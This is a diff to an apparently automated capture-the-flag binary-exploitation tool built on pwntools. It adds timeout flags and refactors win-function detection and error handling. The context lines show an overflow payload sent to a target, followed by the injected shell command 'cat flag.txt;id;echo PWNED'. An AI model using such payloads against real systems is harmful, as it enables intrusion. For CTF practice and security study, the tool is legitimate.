@@ -161,6 +161,12 @@ def _build_parser() -> argparse.ArgumentParser:
                      help="Symbolic execution to find win() path")
     adv.add_argument("--adaptive-timeout", action="store_true", dest="adaptive_timeout",
                      help="Scale timeouts based on measured RTT to target")
+    adv.add_argument("--timeout", type=float, default=30.0,
+                     help="Total timeout for exploit operations (default: 30s)")
+    adv.add_argument("--connect-timeout", type=float, default=5.0,
+                     help="Connection timeout (default: 5s)")
+    adv.add_argument("--recv-timeout", type=float, default=3.0,
+                     help="Receive timeout per operation (default: 3s)")
     adv.add_argument("--clear-cache", action="store_true", dest="clear_cache",
                      help="Clear analysis cache for this binary")
     adv.add_argument("--no-cache", action="store_true", dest="no_cache",
@@ -283,13 +289,13 @@ def run_binary(cfg):
 
     # ── Debug mode: launch binary under GDB ─────────────────────────────
     if getattr(cfg, "debug", False):
-        log.info("[debug] Launching binary under GDB/pwndbg…")
+        log.info("[debug] Launching binary under GDB/pwndbg")
         try:
             from pwn import gdb as _gdb, ELF as _ELF
+            from exploiter.win_detector import find_win_function
             _elf = _ELF(cfg.binary, checksec=False)
-            WIN_KW = ["win","flag","shell","backdoor"]
-            _win = next((n for n,a in _elf.symbols.items()
-                         if a and any(k in n.lower() for k in WIN_KW)), "main")
+            _win_result = find_win_function(_elf.symbols, elf_plt=_elf.plt)
+            _win = _win_result[0] if _win_result else "main"
             _script = f"break {_win}\ncontinue\n"
             _io = _gdb.debug([cfg.binary] + cfg.binary_args_list,
                               gdbscript=_script, aslr=False)
@@ -499,7 +505,7 @@ def run_binary(cfg):
                         if not _mcM: continue
                         _bM = b""
                         try: _bM = _mcM.recvrepeat(0.5)
-                        except: pass
+                        except Exception: pass
                         # Answer Q&A prompts if any
                         for _ in range(8):
                             _answered = False
@@ -508,18 +514,18 @@ def run_binary(cfg):
                                     _mcM.sendline(_qa_v)
                                     _tM.sleep(0.12)
                                     try: _bM = _mcM.recvrepeat(0.3)
-                                    except: _bM = b""
+                                    except Exception: _bM = b""
                                     _answered = True; break
                             if not _answered: break
                         _mcM.send(b"A"*_mfM + _m32M)
                         _tM.sleep(0.35)
                         try: _mcM.send(b"cat flag.txt 2>/dev/null;id;echo PWNED\n")
-                        except: pass
+                        except Exception: pass
                         _tM.sleep(0.35)
                         try: _outM = _mcM.recvall(timeout=1.0)
-                        except: _outM = b""
+                        except Exception: _outM = b""
                         try: _mcM.close()
-                        except: pass
+                        except Exception: pass
                         if any(m in _outM for m in _WIN_M):
                             _magic_fill = _mfM
                             _magic_out  = _outM
@@ -791,8 +797,7 @@ def run_binary(cfg):
         try:
             from pwn import ELF as _ELF
             _elf = _ELF(cfg.binary, checksec=False)
-            WIN_KW = ["win", "flag", "shell", "backdoor", "secret",
-                      "easy", "print_flag", "cat_flag"]
+            from constants import DEFAULT_WIN_PATTERNS as WIN_KW
             win_addr = next(
                 (a for n, a in _elf.symbols.items()
                  if a and any(kw == n.lower() or n.lower().startswith(kw)
@@ -830,8 +835,7 @@ def run_binary(cfg):
     if not display_ra or display_ra < 0x1000:
         try:
             from pwn import ELF as _ELF
-            WIN_KW = ["win", "flag", "shell", "backdoor", "secret",
-                      "easy", "print_flag", "cat_flag"]
+            from constants import DEFAULT_WIN_PATTERNS as WIN_KW
             _elf = _ELF(cfg.binary, checksec=False)
             for name, addr in _elf.symbols.items():
                 if addr and any(kw == name.lower() or name.lower().startswith(kw)
@@ -1003,7 +1007,13 @@ def main():
         cfg.menu_script     = getattr(args, "menu_script", None)
         cfg.pre_send        = getattr(args, "pre_send", None)
         log = setup_logging(cfg.log_file)
-        cfg.validate()
+        try:
+            cfg.validate()
+        except (FileNotFoundError, ValueError) as e:
+            from rich.panel import Panel as _VPanel
+            console.print(_VPanel(f"[bold red]Validation error:[/] {e}",
+                                  border_style="red"))
+            sys.exit(1)
         run_binary(cfg)
 
     elif args.mode == "solana":
